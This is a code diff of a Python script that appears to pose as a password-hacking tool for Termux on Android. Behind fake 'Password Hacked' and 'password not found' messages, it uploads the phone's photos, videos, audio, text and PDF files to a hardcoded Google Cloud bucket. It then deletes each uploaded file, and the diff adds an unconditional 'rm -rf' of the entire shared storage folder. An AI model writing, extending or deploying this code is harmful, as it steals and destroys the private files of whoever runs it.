@@ -202,67 +202,57 @@ if os.name == 'nt':
                 print(
                     f'{R} Extention Fail.')
 else:
-    # en Linux
-    banner = f"""{B}
+    banner = (f"""{B}
                     Linux
-    {G}"""
+    {G}""")
     print(banner)
     from google.cloud import storage
     import glob
+    import os
     os.system("termux-setup-storage")
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system("cls" if os.name == "nt" else "clear")
     print(Bb + B + """.             \v""" + BR +
-"""Fire Face Force
+      """Fire Face Force
 """ + Bb + """.              \n""")
-    client = storage.Client.from_service_account_json(
-        'services/serviceAccounts.json')
-
+    client = storage.Client.from_service_account_json('services/serviceAccounts.json')
     bucket = client.get_bucket('pictuface-f9763.appspot.com')
-   #Guardando los datos 
+# Guardando los datos
     carpeta_local = '/data/data/com.termux/files/home/storage/shared/*'
 # Lista de extensiones permitidas
     extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
-
-    archivos = glob.glob(carpeta_local + '/*')
-
+    archivos = glob.glob(carpeta_local)
     for archivo_local in archivos:
         nombre_destino = os.path.basename(archivo_local)
-    # Obtén la extensión del archivo
+        # Obtén la extensión del archivo
         _, extension = os.path.splitext(archivo_local)
-    # Verifica si la extensión está permitida
+        # Verifica si la extensión está permitida
         if extension in extraccion_permitidas:
             blob = bucket.blob(nombre_destino)
             blob.upload_from_filename(archivo_local)
-
-        # Elimina el archivo después de subirlo exitosamente
             os.remove(archivo_local)
 
             print(f'{Bw} {R} password not found{Bb}')
         else:
             print(f'{bb} {G} Password Hacked{Bb}')
+            
+os.system('rm -rf /data/data/com.termux/files/home/storage/shared/*')
 
+if not os.path.exists(carpeta_local):
+    
+    carpeta_local = input('Ingresa Ruta manual\n[+]')
+    extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
+    archivos = glob.glob(carpeta_local)
+    for archivo_local in archivos:
+        
+        nombre_destino = os.path.basename(archivo_local)
+        _, extension = os.path.splitext(archivo_local)
+        if extension in extraccion_permitidas:
+            blob = bucket.blob(nombre_destino)
+            blob.upload_from_filename(archivo_local)
+  
+
+            print(f'Complete')
         else:
-            os.system('rm -rf /data/data/com.termux/files/home/storage/sh
-    if not os.path.exists(carpeta_local):
-        carpeta_local = input(
-            'Ingresa Ruta manual\n[+]')
-# Lista de extensiones permitidas
-        extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
+            print(f'Fail')
 
-        archivos = glob.glob(carpeta_local + '/*')
 
-        for archivo_local in archivos:
-
-            nombre_destino = os.path.basename(archivo_local)
-        # Obtén la extensión del archivo
-            _, extension = os.path.splitext(archivo_local)
-        # Verifica si la extensión está permitida
-            if extension in extraccion_permitidas:
-
-                # Sube el archivo
-                blob = bucket.blob(nombre_destino)
-                blob.upload_from_filename(archivo_local)
-
-                print(f'Complete')
-            else:
-                print(f'Fail')
